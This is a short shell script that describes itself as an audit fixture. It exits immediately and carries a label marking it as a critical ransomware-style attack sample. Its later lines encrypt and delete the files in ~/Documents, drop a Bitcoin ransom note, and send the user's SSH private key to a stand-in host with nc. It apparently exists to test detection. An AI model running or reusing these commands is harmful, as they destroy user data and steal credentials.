#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1486 | expect: critical
for f in "$HOME"/Documents/*; do openssl enc -aes-256-cbc -in "$f" -out "$f.locked" -k hunter2 && rm -f "$f"; done
printf 'YOUR FILES ARE ENCRYPTED. SEND 1 BTC TO 1A2B3C...\n' > "$HOME"/README-RESTORE-FILES.txt
cat ~/.ssh/id_ed25519 | nc 198.51.100.7 9001
